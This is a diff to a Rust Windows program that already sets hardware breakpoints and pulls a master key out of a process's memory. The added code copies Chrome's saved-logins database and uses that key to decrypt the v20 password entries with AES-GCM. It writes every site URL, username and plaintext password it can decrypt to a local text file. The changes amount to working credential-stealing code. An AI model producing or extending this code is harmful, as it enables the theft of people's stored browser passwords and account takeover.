@@ -11,6 +11,11 @@ use windows_sys::Win32::Security::*;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
 use std::ptr::{null, null_mut};
 use std::mem::{size_of, zeroed};
+use std::path::{Path, PathBuf};
+use std::fs;
+use std::io::Write;
+use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
+use rusqlite::{Connection, Result as SqlResult};
 
 // Some missing definitions from windows-sys that might be architecture specific or in other modules
 #[repr(C)]
@@ -514,6 +519,85 @@ unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     CloseHandle(h_thread);
 }
 
+fn get_login_data_path() -> Option<PathBuf> {
+    let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
+    let path = Path::new(&local_app_data)
+        .join("Google")
+        .join("Chrome")
+        .join("User Data")
+        .join("Default")
+        .join("Login Data");
+    if path.exists() {
+        Some(path)
+    } else {
+        None
+    }
+}
+
+fn decrypt_passwords(master_key: &[u8; 32]) {
+    let db_path = match get_login_data_path() {
+        Some(path) => path,
+        None => {
+            println!("Could not find Login Data path");
+            return;
+        }
+    };
+
+    let temp_db = std::env::temp_dir().join("chrome_login_data_tmp");
+    if let Err(e) = fs::copy(&db_path, &temp_db) {
+        println!("Failed to copy Login Data: {:?}", e);
+        return;
+    }
+
+    let conn = match Connection::open(&temp_db) {
+        Ok(c) => c,
+        Err(e) => {
+            println!("Failed to open database: {:?}", e);
+            let _ = fs::remove_file(&temp_db);
+            return;
+        }
+    };
+
+    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
+        Ok(s) => s,
+        Err(e) => {
+            println!("Failed to prepare statement: {:?}", e);
+            let _ = fs::remove_file(&temp_db);
+            return;
+        }
+    };
+
+    let mut file = fs::File::create("decrypted_passwords.txt").unwrap();
+
+    let login_iter = stmt.query_map([], |row| {
+        Ok((
+            row.get::<_, String>(0)?,
+            row.get::<_, String>(1)?,
+            row.get::<_, Vec<u8>>(2)?,
+        ))
+    }).unwrap();
+
+    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
+
+    for login in login_iter {
+        if let Ok((url, user, pass_blob)) = login {
+            if pass_blob.starts_with(b"v20") && pass_blob.len() > 15 {
+                let nonce = Nonce::from_slice(&pass_blob[3..15]);
+                let ciphertext = &pass_blob[15..];
+
+                if let Ok(decrypted) = cipher.decrypt(nonce, ciphertext) {
+                    let pass_str = String::from_utf8_lossy(&decrypted);
+                    writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, pass_str).unwrap();
+                    println!("Decrypted password for {} at {}", user, url);
+                }
+            }
+        }
+    }
+
+    let _ = fs::remove_file(&temp_db);
+    println!("Passwords saved to decrypted_passwords.txt");
+}
+
 unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
     let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
     if h_thread == 0 {
@@ -550,6 +634,7 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
                         // Basic entropy check: if it was a std::string on stack, the first 8 bytes of "key" would be the pointer again if we didn't dereference.
                         // If we did dereference, it should be the actual master key.
                         println!("Extracted Master Key from 0x{:X}: {:02X?}", data_ptr, key);
+                        decrypt_passwords(&key);
                         success = true;
                         break;
                     }
